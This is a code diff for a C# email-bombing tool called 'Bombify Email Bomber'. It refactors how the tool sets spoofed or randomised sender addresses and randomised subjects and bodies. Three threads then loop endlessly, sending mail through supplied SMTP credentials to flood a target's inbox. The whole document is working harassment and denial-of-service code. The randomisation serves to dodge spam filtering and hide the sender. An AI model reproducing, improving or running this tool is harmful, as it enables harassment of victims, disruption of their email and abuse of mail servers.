@@ -69,25 +69,14 @@ namespace Bombify_Email_Bomber
             // Get user input
             UserInput.GetSmtpInput();
             UserInput.GetModeInput();
+            UserInput.GetSenderInput();
 
             // Check if mode's value is 1
             if (Variables.Mode == 1)
             {
                 // Get user input
-                UserInput.GetSenderInput();
                 UserInput.GetTitleInput();
                 UserInput.GetBodyInput();
-            } else
-            {
-                // Check if mode's value is 2
-                if (Variables.Mode == 2)
-                {
-                    // Get user input
-                    UserInput.GetSenderInput();
-                } else
-                {
-
-                }
             }
 
             // Get user input
@@ -126,7 +115,7 @@ namespace Bombify_Email_Bomber
             Console.Clear();
             Console.ForegroundColor = ConsoleColor.Yellow;
             Console.WriteLine("BOMBER STARTED, Press any key to exit!\n");
-            Thread.Sleep(2000);
+            Thread.Sleep(1500);
 
             // Declair threads
             Thread thread1 = new Thread(Thread1);
@@ -174,6 +163,7 @@ namespace Bombify_Email_Bomber
         {
             while (true)
             {
+                // Send email
                 SendEmail(SmtpCreds(0), int.Parse(SmtpCreds(1)), SmtpCreds(2), SmtpCreds(3));
             }
         }
@@ -183,6 +173,7 @@ namespace Bombify_Email_Bomber
         {
             while (true)
             {
+                // Send email
                 SendEmail(SmtpCreds(0), int.Parse(SmtpCreds(1)), SmtpCreds(2), SmtpCreds(3));
             }
         }
@@ -192,6 +183,7 @@ namespace Bombify_Email_Bomber
         {
             while(true)
             {
+                // Send email
                 SendEmail(SmtpCreds(0), int.Parse(SmtpCreds(1)), SmtpCreds(2), SmtpCreds(3));
             }
         }
@@ -199,18 +191,19 @@ namespace Bombify_Email_Bomber
         // SendMail method
         public static void SendEmail(string Domain, int Port, string Username, string Password)
         {
-            // Check if mode's value is 1
-            if (Variables.Mode == 1)
+            // Check if user wants a customer sender
+            if (Variables.Sender == "None")
             {
-                MailInfo(true, false);
-            } else if (Variables.Mode == 2)
+                // Add default sender
+                Variables.Mail.From = new MailAddress(SmtpCreds(2));
+            } else if (Variables.Sender == "rand")
             {
-                MailInfo(true, true);
+                // Add random sender
+                Variables.Mail.From = new MailAddress(RandomString(true, 12) + "@" + RandomString(true, 6) + "." + RandomString(true, 3));
             } else
             {
-                // Randomize sender
-                Variables.Mail.From = new MailAddress(RandomString(12) + "@" + RandomString(6) + "." + RandomString(3));
-                MailInfo(false, true);
+                // Add custom sender
+                Variables.Mail.From = new MailAddress(Variables.Sender);
             }
 
             // Create new smtpclient instance
@@ -233,6 +226,20 @@ namespace Bombify_Email_Bomber
                 // Choose credentials
                 Smtp.Credentials = new NetworkCredential(Username, Password);
 
+                // Check if mode's value is 1
+                if (Variables.Mode == 1)
+                {
+                    // Add title and body
+                    Variables.Mail.Subject = Variables.Title + " " + RandomString(false, 8);
+                    Variables.Mail.Body = Variables.Body;
+                }
+                else
+                {
+                    // Add random title and body
+                    Variables.Mail.Subject = RandomString(true, 64);
+                    Variables.Mail.Body = RandomString(true, 64);
+                }
+
                 // Handle errors while sending email
                 try
                 {
@@ -249,38 +256,6 @@ namespace Bombify_Email_Bomber
                     Console.ForegroundColor = ConsoleColor.Red;
                     Console.WriteLine("Error sending email with "+ "(" + Domain + ", " + Username + ")");
                 }
-            }
-        }
-
-        public static void MailInfo(bool RunSenderCode, bool RandomizeOther)
-        {
-            // Check if RunSenderCode is true
-            if (RunSenderCode == true)
-            {
-                // Check if user wants a customer sender
-                if (Variables.Sender == "None")
-                {
-                    // Add default sender
-                    Variables.Mail.From = new MailAddress(SmtpCreds(2));
-                }
-                else
-                {
-                    // Add custom sender
-                    Variables.Mail.From = new MailAddress(Variables.Sender);
-                }
-            }
-            // Check if RandomizeOther is false
-            if (RandomizeOther == false)
-            {
-                // Add title and body
-                Variables.Mail.Subject = Variables.Title;
-                Variables.Mail.Body = Variables.Body;
-            }
-            else
-            {
-                // Add random title and body
-                Variables.Mail.Subject = RandomString(64);
-                Variables.Mail.Body = RandomString(256);
             }
         }
 
@@ -305,13 +280,23 @@ namespace Bombify_Email_Bomber
         }
 
         // RandomString method
-        public static string RandomString(int length)
+        public static string RandomString(bool RandomType, int length)
         {
-            // Set characters
-            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            if (RandomType == true)
+            {
+                // Set characters
+                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 
-            // Generate random string
-            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
+                // Generate random string
+                return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
+            } else
+            {
+                // Set characters
+                const string chars = "₀₁₂₃₄₅₆";
+
+                // Generate random string
+                return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
+            }
         }
     }
 }
